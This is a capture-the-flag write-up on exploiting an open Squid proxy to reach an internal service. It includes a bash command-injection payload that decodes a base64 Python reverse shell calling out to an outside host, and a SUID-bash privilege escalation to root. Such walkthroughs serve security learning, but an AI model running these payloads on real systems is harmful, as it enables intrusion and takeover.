# Permission to Proxy

A big rabbit hole ..

The challenge URL http://challenge.ctf.games:30350 is an open Squid Cache proxy server.

There are multiple ways to get a proxy server to proxy some content:
 - GET http://url.here/ HTTP/1.0 - just for HTTP traffic
 - CONNECT 1.2.3.4:443 HTTP/1.0 - usually used for raw TCP connection, e.g. for TLS

I used proxychains-ng and nmap (had issue on kali, but it worked on MacOS, not sure why) to portscan over HTTP proxy (within reason, just top 1000 ports).

That did not yield anything but 22/tcp with SSH that only allowed keys.

After a while I figured it might be just HTTP traffic and tried with spose (https://github.com/aancw/spose). With the
basic port list it did not show anything interesting.

I "extracted" the most common 1000 ports from nmap like this: `nmap -oX - --top-ports 1000 x`.
I then wrote [`nmap_top1000_ports.py`](nmap_top1000_ports.py) to make these into a full list (not just ranges).
Then I modified spoke.py into spoke-ng.py with tqdm, more ports and better detection (code != 403).

Found port 50000/tcp - but only available as `GET http://127.0.0.1:50000 HTTP/1.0`.

```shell
% cat <(echo -n "GET http://127.0.0.1:50000 HTTP/1.0\n\n") - | nc -v challenge.ctf.games 30350
```

The path part of the URL seems to somehow make it to bash and be evaluated, wtf? Does not really matter - let's use it!

We cannot use spaces though, but bash has this neat {command,param1,param2} syntax that we can use and come up with
a full reverse shell using python3 that is on the machine:

```shell
% cat <(echo -n "GET http://127.0.0.1:50000/;{which,python3}; HTTP/1.0\n\n") - | nc -v challenge.ctf.games 30350
```

Full payload is then a random Python reverse shell as base64 to not have to encode the whole damn thing:

```shell
% cat <(echo -n "GET http://127.0.0.1:50000/;{echo,'cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMS4yLjMuNCIsODApKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtwdHkuc3Bhd24oIi9iaW4vc2giKSc='}|{base64,-d}|sh; HTTP/1.0\n\n") - | nc -v challenge.ctf.games 30350
```

That same thing can be also achieved with just curl (make sure globing parser is off though):

```shell
curl --globoff --proxy http://challenge.ctf.games:30350 'http://127.0.0.1:50000/;{which,python3};'
```

Once reverse shell is connected, look around for suid binary and find /bin/bash has a suid bit set, da fuq?!

```shell
$ find / -perm -4000 2>/dev/null

$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1113504 Apr 18  2022 /bin/bash
$
```

Bash will drop privileges unless started with "-p", as discussed, e.g. here:
  - https://unix.stackexchange.com/questions/451048/from-which-version-does-bash-drop-privileges

```shell
bash-4.4$ /bin/bash -p
/bin/bash -p
bash-4.4# cat /root/flag.txt
cat /root/flag.txt
flag{c9bbd4888086111e9f632d4861c103f1}
bash-4.4#
```